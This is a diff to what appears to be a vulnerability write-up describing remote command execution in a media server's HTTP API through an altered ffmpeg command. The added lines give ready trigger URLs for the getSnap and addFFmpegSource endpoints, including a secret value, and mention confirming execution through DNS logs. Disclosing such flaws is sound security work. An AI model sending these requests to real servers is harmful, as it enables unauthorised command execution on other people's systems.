@@ -27,7 +27,11 @@ Modify the command when calling ffmpeg to the host command you wish to execute.
 Of course, we can also modify ffmpegsnap to execute system commands.
 <img width="425" height="377" alt="image" src="https://github.com/user-attachments/assets/2fcccbdf-a5fc-46b2-ba89-1b2edea353fb" />
 
+Then visit the link to trigger command execution.If the modified ffmpeg.snap is present, access the first one; otherwise, access the second one.
 
+http://127.0.0.1/index/api/getSnap?url=http://1.1.1.1/&timeout_sec=10&expire_sec=30&secret=035c73f7-bb6b-4889-a715-d9eb2d1925cc
+
+http://127.0.0.1/index/api/addFFmpegSource?src_url=http://live.hkstv.hk.lxdns.com/live/hks2/playlist.m3u8&dst_url=rtmp://127.0.0.1/live/hks2&timeout_ms=10000&ffmpeg_cmd_key=ffmpeg.cmd
 
 Execute system commands to access DNS logs.
 
